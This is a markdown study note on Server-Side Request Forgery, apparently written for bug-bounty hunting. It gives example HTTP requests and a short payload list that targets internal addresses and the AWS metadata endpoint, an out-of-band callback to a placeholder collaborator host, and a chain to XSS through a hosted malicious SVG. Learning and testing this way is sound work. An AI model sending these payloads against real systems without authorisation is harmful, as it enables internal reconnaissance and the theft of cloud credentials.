""# 🚨 Server-Side Request Forgery (SSRF)

---

## 💡 **What is SSRF?**
**SSRF (Server-Side Request Forgery)** is a vulnerability that allows an attacker to make the server-side application send requests to unintended locations, potentially exposing sensitive data from internal servers or other resources.

---

## 🧠 **Example Scenario:**
A website sends a request to its database to check for a product:
```http
GET /example.txt?file=product.txt HTTP/1.1
Host: localhost:8000
User-Agent: example
Accept: */*
Connection: close
```

### 🔍 **Exploitation:**
By changing `product.txt` to `passwords.txt` or `http://localhost:8080`, an attacker might retrieve sensitive data.

---

## 🔗 **SSRF for Recon:**
```http
SSRF can be used for recon like this: http://internal-ip:port

lets take the first vulnarable endpoint
GET /example?url=product.txt HTTP/1.1
Host: example.com
User-Agent: example
Accept: */*
Connection: close
we can replace (product.txt) with http://internal-ip:port
which will look like this:
GET /example?url=http://192.168.1.1:80 HTTP/1.1
Host: example.com
User-Agent: example
Accept: */*
Connection: close
```

---

## 🚦 **Common Payloads For Internal Scanning:**
- `http://localhost:8000/admin`
- `http://127.0.0.1:3306` (MySQL)
- `http://169.254.169.254/latest/meta-data` (AWS Metadata)
- `http://internal-api.local/api/v1/users` (Accessing Internal APIs)

---

## 🔗 **Triggering Out-of-Band (OOB) Requests:**
- Use **Burp Collaborator**, **Interactsh**, or your own server to identify:
  - Internal hostnames
  - Egress points
  - Firewall rules

**Example:**
```http
GET /vulnerable-endpoint?url=http://your-collaborator-server.com
```

---

## 🔗 **Chaining SSRF with Other Bugs:**
you can chain ssrf with bugs like **XSS** (Check my xss note for more detailed info about it):
```http
the endpoint will look like this:
GET /example.txt?file=product.txt HTTP/1.1
Host: localhost:8000
User-Agent: example
Accept: */*
Connection: close

you can make the server-side app retrieve a file that you hosted on your server which has malicious code Like this:
GET /example.txt?file=http://yourWebsite/XSS.svg HTTP/1.1
Host: localhost:8000
User-Agent: example
Accept: */*
Connection: close
```

---

## 🎯 **Impact:**
The severity ranges from **medium** to **critical** based on the data exposed.

---

## 💡 **Tips for Finding SSRF:**
- Can sensitive data be accessed?
- Is privilege escalation possible?
- Can SSRF lead to **lateral movement** within the network?
- Is there potential for **chaining** with other bugs?
- Always explore escalation opportunities!

---

## 🌐 **Where to Look for SSRF Vulnerabilities:**

### 1. **URL Fetching Functionality:**
- File Uploads
- Image/Media Previews
- PDF Generation (e.g., **wkhtmltopdf**)
- Social Media Embeds

### 2. **Webhooks & Integrations:**
- Webhook Callbacks
- Third-Party API Integrations

### 3. **File Retrieval & Proxying:**
- File Download Endpoints
- HTTP Proxy Functionality
- URL Shorteners

### 4. **Import/Export Features:**
- Data Imports (CSV, XML, JSON)
- Feeds & Syndication (RSS/Atom)

### 5. **API Interactions:**
- GraphQL or REST APIs with URL parameters
- Cloud Metadata Services (AWS, GCP, Azure)

### 6. **Admin Panels & Internal Tools:**
- Admin Functionality for Fetching URLs
- Monitoring & Debug Tools

### 7. **Uncommon Protocols:**
- `file://`, `gopher://`, `ftp://`, `dict://`
- Email Services (`mailto:` interaction with SMTP servers)

---

## 📚 **Helpful Resources:**
1. 📝 **PortSwigger SSRF Topic:** [Read more](https://portswigger.net/web-security/ssrf)
2. 🎓 **Snyk SSRF Lesson:** [Learn here](https://learn.snyk.io/lesson/ssrf-server-side-request-forgery/)
3. 📖 **Medium Writeups:**
   - [Bypassing SSRF Protection](https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b)
   - [Highest Bounty Ever](https://medium.com/techfenix/ssrf-server-side-request-forgery-worth-4913-my-highest-bounty-ever-7d733bb368cb)
   - [SSRF to Server Takeover](https://medium.com/@malvinval/ssrf-to-server-takeover-poc-bug-bounty-writeup-82d6715e333d)
   - [HackerOne SSRF Story](https://medium.com/@josekuttykunnelthazhebinu/how-i-uncovered-an-ssrf-vulnerability-in-a-private-hackerone-program-4c3146b414ff)

---
""

